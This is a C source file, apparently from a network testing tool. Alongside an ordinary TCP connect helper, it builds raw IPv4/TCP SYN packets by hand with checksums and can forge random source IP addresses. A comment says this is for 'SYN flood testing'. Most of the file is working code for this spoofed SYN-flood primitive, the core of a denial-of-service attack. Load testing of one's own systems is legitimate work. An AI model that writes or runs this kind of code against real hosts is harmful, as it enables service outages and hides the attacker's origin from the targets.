// src/connection.c
#include "connection.h"
#include <arpa/inet.h>
#include <netinet/ip.h>
#include <netinet/tcp.h>
#include <stdbool.h>
#include <stdio.h>
#include <stdlib.h>
#include <string.h>
#include <sys/socket.h>
#include <unistd.h>

/*
 * Get a random seed from /dev/urandom immediately,
 * which is a non-blocking source of random data.
 */
static unsigned int get_random_seed(void) {
    unsigned int seed;
    FILE *fp = fopen("/dev/urandom", "rb");
    if (fp == NULL) {
        perror("Failed to open /dev/urandom");
        exit(EXIT_FAILURE);
    }
    if (fread(&seed, sizeof(seed), 1, fp) != 1) {
        perror("Failed to read random seed");
        fclose(fp);
        exit(EXIT_FAILURE);
    }
    fclose(fp);
    return seed;
}

/*
 * Calculate the IPv4 checksum for a given buffer.
 * It follows the following algorithm:
 *
 * 1. Cast the buffer into 16-bit words and accumulate into a sum (uint32_t)
 * 2. If there's a leftover byte, add it as an unsigned char (uint8_t)
 * 3. Fold any overflow from high 16 bits into the low 16 bits
 *    until the sum fits into 16 bits (No carry)
 * 4. Invert the bits of the sum to get the checksum.
 *
 */
static unsigned short checksum(void *buf, int len) {
    uint32_t sum = 0;
    uint16_t *w = buf;
    while (len > 1) {
        sum += *w++;
        len -= 2;
    }
    if (len) {
        sum += *(uint8_t *)w;
    }
    while (sum >> 16) {
        sum = (sum & 0xFFFF) + (sum >> 16);
    }
    return (unsigned short)(~sum);
}

/* Pseudo-header structure for TCP checksum calculation */
struct pseudo_header {
    uint32_t src_addr;
    uint32_t dst_addr;
    uint8_t placeholder;
    uint8_t protocol;
    uint16_t tcp_length;
};

/*
 * Connect to a server using TCP.
 * Returns the socket file descriptor on success,
 * or -1 on failure.
 */
int connect_to_server(const char *ip, int port) {
    int sock;
    struct sockaddr_in sa = {0};

    if ((sock = socket(AF_INET, SOCK_STREAM, 0)) < 0) {
        perror("socket");
        return -1;
    }

    sa.sin_family = AF_INET;
    sa.sin_port = htons(port);
    if (inet_pton(AF_INET, ip, &sa.sin_addr) != 1) {
        perror("inet_pton");
        close(sock);
        return -1;
    }
    if (connect(sock, (struct sockaddr *)&sa, sizeof(sa)) < 0) {
        perror("connect");
        close(sock);
        return -1;
    }

    return sock;
}

int send_tcp_syn(const char *dest_ip, int port, const char *src_ip,
                 bool random_src) {
    static bool seeded = false;
    if (!seeded) {
        srand(get_random_seed());
        seeded = true;
    }

    int sock = socket(AF_INET, SOCK_RAW, IPPROTO_TCP);
    if (sock < 0) {
        perror("raw socket");
        return -1;
    }

    int on = 1;
    if (setsockopt(sock, IPPROTO_IP, IP_HDRINCL, &on, sizeof(on)) < 0) {
        perror("setsockopt");
        close(sock);
        return -1;
    }

    // prepare dest
    struct sockaddr_in dest = {.sin_family = AF_INET,    // NOLINT
                               .sin_port = htons(port)}; // NOLINT
    if (inet_pton(AF_INET, dest_ip, &dest.sin_addr) != 1) {
        perror("inet_pton dest");
        close(sock);
        return -1;
    }

    // packet buffers
    uint8_t packet[sizeof(struct iphdr) + sizeof(struct tcphdr)] = {0};
    struct iphdr *ip_hdr = (struct iphdr *)packet;
    struct tcphdr *tcp_hdr = (struct tcphdr *)(packet + sizeof(*ip_hdr));

    // decide source IP
    uint32_t saddr;
    if (random_src) {
        uint32_t r = rand();
        saddr = htonl((r & 0xFF) << 24          // NOLINT
                      | ((r >> 8) & 0xFF) << 16 // NOLINT
                      | ((r >> 16) & 0xFF) << 8 // NOLINT
                      | ((r >> 24) & 0xFF));    // NOLINT
    } else {
        if (inet_pton(AF_INET, src_ip, (void *)&saddr) != 1) {
            perror("inet_pton src");
            close(sock);
            return -1;
        }
    }

    // random source port
    uint16_t sport = (rand() % (65535 - 1024)) + 1024;

    /*
     * IP header (struct iphdr)
     *
     * - ihl/version:   4 bits each for header length and IPv4 version.
     * - tos:           8 bit Type-of-Service (ToS) field.
     * - tot_len:       Total packet size (network-byte order)
     * - id:            Fragment identification (randomized)
     * - ttl:           8 bit Time-to-Live (TTL) field.
     * - protocol:      8 bit protocol field (TCP). Set to IPPROTO_TCP.
     * - saddr/daddr:   32 bit source/destination address (network-byte order).
     * - check:         16 bit checksum
     */
    ip_hdr->ihl = 5;
    ip_hdr->version = 4;
    ip_hdr->tos = 0;
    ip_hdr->tot_len = htons(sizeof(*ip_hdr) + sizeof(*tcp_hdr));
    ip_hdr->id = htons(rand() & 0xFFFF);
    ip_hdr->frag_off = 0;
    ip_hdr->ttl = 64;
    ip_hdr->protocol = IPPROTO_TCP;
    ip_hdr->saddr = saddr;
    ip_hdr->daddr = dest.sin_addr.s_addr;
    ip_hdr->check = checksum(ip_hdr, sizeof(*ip_hdr));

    /*
     * TCP header (struct tcphdr)
     *
     * - source/dest:   16 bit source/destination port (network-byte order).
     * - seq/ack_seq:   32 bit sequence/acknowledgment number
     *                  (network-byte order).
     * - doff:          4 bit data offset (header length in 32-bit words).
     * - flags:         8 bit flags (SYN, ACK, etc.).
     *                  Set SYN flag for SYN flood testing.
     * - window:        16 bit window size (network-byte order).
     */
    tcp_hdr->source = htons(sport);
    tcp_hdr->dest = htons(port);
    tcp_hdr->seq = htonl(rand());
    tcp_hdr->ack_seq = 0;
    tcp_hdr->doff = 5;
    tcp_hdr->syn = 1;
    tcp_hdr->window = htons(5840);
    tcp_hdr->check = 0;
    tcp_hdr->urg_ptr = 0;

    /*
     * To compute the TCP checksum, prepend a 12-byte pseudo-header.
     *
     * - src_addr:      32 bit source address (network-byte order).
     * - dst_addr:      32 bit destination address (network-byte order).
     * - placeholder:   8 bit placeholder (set to 0).
     * - protocol:      8 bit protocol (set to IPPROTO_TCP).
     * - tcp_length:    16 bit TCP length (network-byte order).
     */
    struct pseudo_header psh = {.src_addr = ip_hdr->saddr,
                                .dst_addr = ip_hdr->daddr,
                                .placeholder = 0,
                                .protocol = IPPROTO_TCP,
                                .tcp_length = htons(sizeof(*tcp_hdr))};

    // pseudo-header checksum
    uint8_t buf[sizeof(psh) + sizeof(*tcp_hdr)];
    memcpy(buf, &psh, sizeof(psh));
    memcpy(buf + sizeof(psh), tcp_hdr, sizeof(*tcp_hdr));
    tcp_hdr->check = checksum(buf, sizeof(buf));

    // send
    if (sendto(sock, packet, ntohs(ip_hdr->tot_len), 0,
               (struct sockaddr *)&dest, sizeof(dest)) < 0) {
        perror("sendto");
        close(sock);
        return -1;
    }

    close(sock);
    return 0;
}
